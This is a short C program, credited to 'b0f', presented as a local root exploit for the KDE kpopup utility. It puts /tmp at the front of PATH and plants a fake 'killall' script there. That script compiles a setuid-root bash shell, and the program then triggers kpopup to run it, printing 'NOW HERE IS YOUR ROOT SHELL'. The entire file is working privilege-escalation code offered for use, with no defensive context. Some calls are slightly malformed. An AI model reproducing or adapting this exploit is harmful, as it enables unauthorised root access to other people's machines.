
/*Local root exploit for kpopup
 *by b0f www.b0f.net
 */
#include <stdio.h>
int main()
{
setenv("PATH=/tmp:/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:\
/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin:");
FILE *fd;
fd = fopen("/tmp/killall", "w");{
fprintf(fd, "#!/bin/sh\n");
fprintf(fd, "cd /tmp\n");
fprintf(fd, "/bin/cat > shell.c << EOF\n");
fprintf(fd, "#include <stdio.h>\n");
fprintf(fd, "int main()\n");
fprintf(fd, "{\n");
fprintf(fd, "setuid(0);\n");
fprintf(fd, "setgid(0);\n");
fprintf(fd, "execl(\"/bin/bash\", \"-bash\", NULL);\n");
fprintf(fd, "return 0;\n");
fprintf(fd, "}\n");
fprintf(fd, "EOF\n");
fprintf(fd, "/usr/bin/gcc /tmp/shell.c -o /tmp/shell\n");
fprintf(fd, "/bin/chown root.root /tmp/shell\n");
fprintf(fd, "/bin/chmod 6711 /tmp/shell\n");
fprintf(fd, "echo NOW HERE IS YOUR ROOT SHELL\n");
fprintf(fd, "/tmp/shell\n");
fclose(fd);
system("chmod +x /tmp/killall");
system("/usr/local/kde/bin/kpopup root shell");
return 0;
}
}
